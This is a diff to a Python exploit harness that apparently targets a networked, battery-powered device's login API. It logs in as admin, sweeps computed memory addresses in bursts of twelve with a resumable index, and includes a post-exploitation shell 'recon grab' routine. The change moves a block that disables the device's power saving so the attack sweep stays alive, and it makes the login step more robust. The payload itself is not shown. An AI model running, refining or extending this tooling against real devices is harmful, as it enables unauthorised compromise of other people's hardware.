@@ -44,7 +44,10 @@ def login_once():
     r = T.post(HOST, "/", {"method": "login", "params": {"cnonce": "", "encrypt_type": "3", "username": "admin"}}, timeout=3)
     if not r.strip():
         return None
-    return T.login(HOST)
+    try:
+        return T.login(HOST)
+    except SystemExit:      # login gives up if the window dies mid-handshake
+        return None
 
 def grab_and_postshell():
     log("SHELL — in-band recon grab")
@@ -85,20 +88,6 @@ def main():
             log(f"DS UP (try {tries}) — disabling sleep + bursting from index {idx}")
             emit("ds_state", {"state": "up", "tries": tries, "idx": idx})
             sess = stok  # T.login returns the whole session (stok/seq/lsk/ivb)
-            # Ask for sleep-off WITH the session. The shell script posts all methods blind to
-            # the unauthenticated endpoint; a real session turns this into an answerable call,
-            # and a unit that accepts it stops flapping and stops the whole sweep.
-            for sm in ({"method": "battery_set_power_save",
-                        "params": {"power_save": {"enable": False}}},
-                       {"method": "battery_set_power_supply_mode",
-                        "params": {"power_supply_mode": "wired_always_on"}}):
-                try:
-                    r = T.req(HOST, sess, sm, timeout=6)
-                    ts = str(r)[:100]
-                    log(f"sleep-off {sm['method']} -> {ts}")
-                    emit("sleep_off", {"method": sm["method"], "resp": ts})
-                except Exception as e:
-                    log(f"sleep-off {sm['method']} exc {e}")
             fired = 0
             while fired < 12:
                 addr = BASE + idx * STEP
@@ -125,6 +114,21 @@ def main():
                 with open(STATE, "w") as f: f.write(str(idx))
                 idx += 1
                 fired += 1
+            # sleep-off last: it costs seconds, and the shots matter more than the reply
+            # Ask for sleep-off WITH the session. The shell script posts all methods blind to
+            # the unauthenticated endpoint; a real session turns this into an answerable call,
+            # and a unit that accepts it stops flapping and stops the whole sweep.
+            for sm in ({"method": "battery_set_power_save",
+                        "params": {"power_save": {"enable": False}}},
+                       {"method": "battery_set_power_supply_mode",
+                        "params": {"power_supply_mode": "wired_always_on"}}):
+                try:
+                    r = T.req(HOST, sess, sm, timeout=6)
+                    ts = str(r)[:200]
+                    log(f"sleep-off {sm['method']} -> {ts}")
+                    emit("sleep_off", {"method": sm["method"], "resp": ts})
+                except Exception as e:
+                    log(f"sleep-off {sm['method']} exc {e}")
             log("burst done (12) — back to polling")
             tries = 0
         else:
